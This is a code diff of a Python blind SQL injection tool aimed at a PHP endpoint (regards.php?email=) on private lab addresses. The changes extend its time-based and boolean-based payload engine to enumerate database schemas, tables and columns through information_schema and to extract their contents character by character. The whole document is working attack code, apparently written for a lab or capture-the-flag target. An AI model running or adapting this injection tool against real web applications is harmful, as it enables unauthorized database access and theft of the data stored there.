@@ -5,14 +5,20 @@ from urllib.parse import quote_plus
 from time import time
 from itertools import chain
 from argparse import ArgumentParser
+import sys
 
 
 class Blind():
 	def __init__(self, url='http://10.102.10.42/regards.php?email=',
-				 delay=0.1, boolean=False, indicator=None):
+				 delay=0.1, boolean=False, indicator=None, verbosity=0):
 		self.url = url
 		self.delay = delay
 		self.boolean = boolean
+		self.debug = verbosity
+		self.db = None
+		self.table = None
+		self.expression = None
+
 		if self.boolean:
 			self.make_payload = self.make_bool_payload
 		else:
@@ -54,6 +60,7 @@ class Blind():
 
 
 	def get_length(self, item):
+		self.expression = item
 		condition = 'LENGTH(' + item + ')={}'
 		r = False
 		i = 0
@@ -82,6 +89,12 @@ class Blind():
 					break
 
 			string += chr(j)
+			if self.debug:
+				print(chr(j), end='')
+				sys.stdout.flush()
+
+		if self.debug:
+			print()
 
 		return string
 
@@ -89,25 +102,42 @@ class Blind():
 		if cond:
 			return self.send(self.make_payload(cond))
 
-	def get_db(self):
-		return self.get_string('DATABASE()')
+	def get_db(self, force=False):
+		if self.db:
+			return self.db
+		if force:
+			return self.get_string('DATABASE()')
+		else:
+			return None
 
-	def get_table(self, db):
-		if not db:
-			db = self.get_db()
-		cond = "(SELECT table_name FROM information_schema.tables "
-		cond += "WHERE table_schema='{}')".format(db)
+	def get_schemas(self):
+		cond = '(SELECT GROUP_CONCAT(DISTINCT table_schema) FROM '
+		cond += 'information_schema.tables'
 		return self.get_string(cond)
 
-	def get_columns(self, table, db):
+	def get_tables(self, db=None):
+		if not db:
+			db = self.get_db(force=True)
+
+		cond = "(SELECT GROUP_CONCAT(DISTINCT table_name) FROM "
+		cond += "information_schema.tables"
+		cond += " WHERE table_schema='{}'".format(db)
+		cond += " LIMIT 1)"
+		return self.get_string(cond)
+
+	def get_columns(self, table=None, db=None):
 		if not db:
 			db = self.get_db()
 		if not table:
-			table = self.get_table(db)
+			table = self.table
+		if not table:
+			error = 'No table specified, using first table found: {}'
+			table = self.get_tables(db).split(',')[0]
+			print(error.format(table))
 
 		cond = "(SELECT GROUP_CONCAT(column_name) FROM information_"
 		cond += "schema.columns WHERE table_schema='{}' AND "
-		cond += "table_name='{}')"
+		cond += "table_name='{}' LIMIT 1)"
 		cond = cond.format(db, table)
 
 		return self.get_string(cond)
@@ -115,9 +145,12 @@ class Blind():
 
 def get_args():
 	parser = ArgumentParser()
-	parser.add_argument('-t', '--test', help='Condition to test')
-	parser.add_argument('-l', '--length', help='Get length of element')
-	parser.add_argument('-s', '--string', help='Get the string')
+	parser.add_argument('-t', '--test', action='store_true',
+						help='Test expression')
+	parser.add_argument('-l', '--length', action='store_true',
+						help="Get length of expressions's result")
+	parser.add_argument('-s', '--string', action='store_true',
+						help='Get the string resulting from expression')
 	parser.add_argument('-d', '--delay', default=0.1, type=float,
 						help='Delay for time-based blind')
 	parser.add_argument('-b', '--bool', action='store_true',
@@ -126,21 +159,47 @@ def get_args():
 						help='Indicator for bool-based blind')
 	parser.add_argument('-u', '--url',  help='Target URL',
 						default='http://10.102.8.197/regards.php?email=')
+	parser.add_argument('--get-schemas', action='store_true',
+						help='Get table schemas')
+	parser.add_argument('--get-tables', action='store_true',
+						help='Get tables from database')
+	parser.add_argument('--get-columns', action='store_true',
+						help='Get columns from database')
+	parser.add_argument('--table', help='Act on specified table')
+	parser.add_argument('--db', help='Act on specified DB')
+	parser.add_argument('-v', default=0, action='count', dest='verbosity',
+						help='Verbosity')
+	parser.add_argument('-e', '--expression', default='DATABASE()',
+						help='Expression to check')
 
 	return parser.parse_args()
 
 
 if __name__ == '__main__':
 	args = get_args()
-	b = Blind(url=args.url, delay=args.delay, boolean=args.bool)
+	b = Blind(url=args.url, delay=args.delay, boolean=args.bool,
+			  verbosity=args.verbosity)
+	results = {}
 
 	if args.indicator:
 		b.indicator = args.indicator
 
-	# print(b.get_string('DATABASE()'))
+	if args.db:
+		b.db = args.db
+	if args.table:
+		b.table = args.table
+	if args.get_schemas:
+		results['schemas'] = b.get_schemas()
+	if args.get_tables:
+		results['tables'] = b.get_tables()
+	if args.get_columns:
+		results['columns'] = b.get_columns()
 	if args.test:
-		print(b.test(args.test))
+		results['test'] = b.test(args.expression)
 	if args.length:
-		print(b.get_length(args.length))
+		results['length'] = b.get_length(args.expression)
 	if args.string:
-		print(b.get_string(args.string))
+		results['string'] = b.get_string(args.expression)
+
+	results['expression'] = b.expression
+	print('\n{}'.format(results))
